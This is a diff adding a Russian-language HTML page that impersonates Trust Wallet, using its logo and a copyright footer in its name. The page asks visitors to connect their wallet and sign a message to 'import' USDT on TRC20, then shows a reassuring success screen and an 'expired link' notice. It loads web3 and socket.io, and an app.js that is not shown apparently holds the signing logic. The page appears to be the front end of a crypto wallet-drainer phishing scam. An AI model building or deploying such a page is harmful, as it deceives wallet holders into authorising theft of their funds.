@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet Token Import</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust Wallet">
+            </div>
+            <h1>Импорт токена USDT (TRC20)</h1>
+        </header>
+
+        <main>
+            <div id="loading-screen" class="screen">
+                <div class="loader"></div>
+                <p>Загрузка...</p>
+            </div>
+
+            <div id="connect-screen" class="screen hidden">
+                <div class="card">
+                    <h2>Подключите кошелек</h2>
+                    <p>Для импорта токена необходимо подключить ваш Trust Wallet.</p>
+                    <button id="connect-wallet-btn" class="btn-primary">
+                        <i class="fas fa-wallet"></i> Подключить кошелек
+                    </button>
+                </div>
+            </div>
+
+            <div id="sign-screen" class="screen hidden">
+                <div class="card">
+                    <h2>Подпишите сообщение</h2>
+                    <p>Пожалуйста, подпишите сообщение в вашем кошельке, чтобы подтвердить импорт токена.</p>
+                    
+                    <div class="token-info">
+                        <div class="token-icon">
+                            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT">
+                        </div>
+                        <div class="token-details">
+                            <h3>Tether (USDT)</h3>
+                            <p>Сеть: TRC20 (TRON)</p>
+                            <p>Адрес: <span class="address">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span></p>
+                        </div>
+                    </div>
+                    
+                    <div class="message-to-sign">
+                        <p>Сообщение для подписи:</p>
+                        <div class="message-box" id="message-box"></div>
+                    </div>
+                    
+                    <button id="sign-message-btn" class="btn-primary">
+                        <i class="fas fa-signature"></i> Подписать сообщение
+                    </button>
+                </div>
+            </div>
+
+            <div id="success-screen" class="screen hidden">
+                <div class="card">
+                    <div class="success-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <h2>Импорт завершен!</h2>
+                    <p>Токен USDT (TRC20) успешно импортирован в ваш кошелек.</p>
+                    
+                    <div class="token-info">
+                        <div class="token-icon">
+                            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT">
+                        </div>
+                        <div class="token-details">
+                            <h3>Tether (USDT)</h3>
+                            <p>Сеть: TRC20 (TRON)</p>
+                            <p>Адрес: <span class="address">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span></p>
+                        </div>
+                    </div>
+                    
+                    <p>Теперь вы можете использовать этот токен в своем кошельке Trust Wallet.</p>
+                    
+                    <button id="done-btn" class="btn-secondary">
+                        <i class="fas fa-check"></i> Готово
+                    </button>
+                </div>
+            </div>
+
+            <div id="error-screen" class="screen hidden">
+                <div class="card">
+                    <div class="error-icon">
+                        <i class="fas fa-exclamation-circle"></i>
+                    </div>
+                    <h2>Произошла ошибка</h2>
+                    <p id="error-message">Что-то пошло не так. Пожалуйста, попробуйте еще раз.</p>
+                    
+                    <button id="retry-btn" class="btn-primary">
+                        <i class="fas fa-redo"></i> Попробовать снова
+                    </button>
+                </div>
+            </div>
+
+            <div id="expired-screen" class="screen hidden">
+                <div class="card">
+                    <div class="error-icon">
+                        <i class="fas fa-clock"></i>
+                    </div>
+                    <h2>Ссылка истекла</h2>
+                    <p>Срок действия этой ссылки истек. Пожалуйста, запросите новую ссылку для импорта токена.</p>
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <p>&copy; 2023 Trust Wallet. Все права защищены.</p>
+        </footer>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
+    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+    <script src="app.js"></script>
+</body>
+</html> 
